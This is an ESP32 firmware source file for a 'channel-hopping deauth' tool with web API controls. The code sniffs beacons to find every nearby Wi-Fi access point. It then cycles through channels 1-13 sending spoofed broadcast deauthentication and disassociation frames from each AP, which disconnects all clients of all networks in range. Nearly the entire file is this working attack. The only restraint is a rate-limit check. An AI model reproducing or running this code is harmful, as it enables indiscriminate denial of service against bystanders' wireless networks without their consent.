#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// Channel-hopping deauth: scan all 13 channels, deauth every visible AP + BC
// Discovers APs passively then sends deauth to all of them on their channels
static bool chd_running = false;
static volatile uint32_t chd_sent = 0;
static volatile uint8_t chd_ch = 1;
static TaskHandle_t chd_task = nullptr;

struct ChdAP {
  uint8_t bssid[6];
  uint8_t ch;
};
static ChdAP chd_aps[32];
static int chd_ap_count = 0;

static void chd_sniff(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT)
    return;
  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *pl = p->payload;
  if (pl[0] != 0x80)
    return;  // only beacons
  const uint8_t *bssid = pl + 16;
  if (bssid[0] == 0xff)
    return;
  for (int i = 0; i < chd_ap_count; i++)
    if (memcmp(chd_aps[i].bssid, bssid, 6) == 0)
      return;  // already known
  if (chd_ap_count < 32) {
    memcpy(chd_aps[chd_ap_count].bssid, bssid, 6);
    chd_aps[chd_ap_count].ch = (uint8_t)p->rx_ctrl.channel;
    chd_ap_count++;
  }
}

void aegisSniff(void *, wifi_promiscuous_pkt_type_t);
static void chd_run(void *) {
  uint8_t f[32];
  chd_sent = 0;
  static const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
  wifi_promiscuous_filter_t flt = {};
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous_rx_cb(chd_sniff);
  esp_wifi_set_promiscuous(true);

  while (chd_running) {
    for (int ci = 0; ci < 13 && chd_running; ci++) {
      uint8_t ch = channels[ci];
      chd_ch = ch;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(60));  // dwell to hear beacons
      // Deauth all known APs on this channel + broadcast deauth
      for (int ai = 0; ai < chd_ap_count && chd_running; ai++) {
        if (chd_aps[ai].ch != ch)
          continue;
        if (!safety_rate_ok(1)) {
          vTaskDelay(pdMS_TO_TICKS(50));
          continue;
        }
        // BC deauth FROM this AP
        size_t n = f_deauth(f, BC, chd_aps[ai].bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        chd_sent++;
        // BC disassoc
        n = f_disassoc(f, BC, chd_aps[ai].bssid, 8);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        chd_sent++;
      }
    }
  }
  esp_wifi_set_promiscuous_rx_cb(aegisSniff);
  flt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&flt);
  esp_wifi_set_promiscuous(true);
  chd_task = nullptr;
  vTaskDelete(nullptr);
}

static bool chd_start(const String &) {
  chd_ap_count = 0;
  chd_running = true;
  chd_sent = 0;
  xTaskCreate(chd_run, "chd_run", 4096, nullptr, 5, &chd_task);
  return true;
}
static void chd_stop() {
  chd_running = false;
}
static void chd_routes() {
  extern WebServer server;
  server.on("/api/chanhop/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("chanhop", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/chanhop/stop", HTTP_POST, []() {
    tool_stop("chanhop");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/chanhop/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(chd_running ? 1 : 0) + ",\"sent\":" + String(chd_sent) +
                    ",\"aps\":" + String(chd_ap_count) + ",\"ch\":" + String(chd_ch) +
                    ",\"msg\":\"ch" + String(chd_ch) + " " + String(chd_ap_count) + "APs " +
                    String(chd_sent) + "tx\"}");
  });
  server.on("/api/chanhop/aps", HTTP_GET, []() {
    String j = "[";
    for (int i = 0; i < chd_ap_count; i++) {
      if (i)
        j += ",";
      char mac[18];
      snprintf(mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", chd_aps[i].bssid[0], chd_aps[i].bssid[1],
               chd_aps[i].bssid[2], chd_aps[i].bssid[3], chd_aps[i].bssid[4], chd_aps[i].bssid[5]);
      j += "{\"bssid\":\"";
      j += mac;
      j += "\",\"ch\":";
      j += chd_aps[i].ch;
      j += "}";
    }
    j += "]";
    server.send(200, "application/json", j);
  });
}
